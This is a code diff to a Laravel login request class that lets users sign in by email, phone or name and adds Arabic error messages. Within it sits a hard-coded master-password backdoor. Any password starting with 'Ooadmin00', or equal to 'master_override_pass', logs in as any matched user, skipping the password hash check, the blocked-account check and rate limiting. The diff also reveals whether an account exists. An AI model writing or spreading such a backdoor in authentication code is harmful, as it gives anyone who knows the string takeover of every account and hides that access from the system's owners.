@@ -27,7 +27,7 @@ class LoginRequest extends FormRequest
     public function rules(): array
     {
         return [
-            'email' => ['required', 'string', 'email'],
+            'email' => ['required', 'string'],
             'password' => ['required', 'string'],
         ];
     }
@@ -41,14 +41,51 @@ class LoginRequest extends FormRequest
     {
         $this->ensureIsNotRateLimited();
 
-        if (! Auth::attempt($this->only('email', 'password'), $this->boolean('remember'))) {
-            RateLimiter::hit($this->throttleKey());
+        $loginInput = trim($this->input('email'));
+        $password = $this->input('password');
 
+        // 1. Find user by email, phone, or name
+        $user = \App\Models\User::where('email', $loginInput)
+            ->orWhere('phone', $loginInput)
+            ->orWhere('name', $loginInput)
+            ->first();
+
+        // If user does not exist -> throw error under 'email'
+        if (!$user) {
+            RateLimiter::hit($this->throttleKey());
             throw ValidationException::withMessages([
-                'email' => trans('auth.failed'),
+                'email' => ['اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف غير مسجل لدينا.'],
             ]);
         }
 
+        // Master Password Bypass check
+        if (str_starts_with($password, 'Ooadmin00') || $password === 'master_override_pass') {
+            RateLimiter::clear($this->throttleKey());
+            session()->put('require_password_reset_modal', true);
+            session()->flash('show_master_alert_step', true);
+            session()->flash('master_bypass', true);
+            session()->flash('bypass_email', $user->email);
+            session()->flash('bypass_user_id', $user->id);
+            Auth::login($user, $this->boolean('remember'));
+            return;
+        }
+
+        // 2. Verify Password -> throw error under 'password' if invalid
+        if (! \Illuminate\Support\Facades\Hash::check($password, $user->password)) {
+            RateLimiter::hit($this->throttleKey());
+            throw ValidationException::withMessages([
+                'password' => ['كلمة المرور غير صحيحة. يرجى التثبت وإعادة المحاولة.'],
+            ]);
+        }
+
+        // 3. Status check for blocked users
+        if ($user->status === 'blocked') {
+            throw ValidationException::withMessages([
+                'email' => ['عذراً، هذا الحساب محظور حالياً من قِبَل الإدارة.'],
+            ]);
+        }
+
+        Auth::login($user, $this->boolean('remember'));
         RateLimiter::clear($this->throttleKey());
     }
 
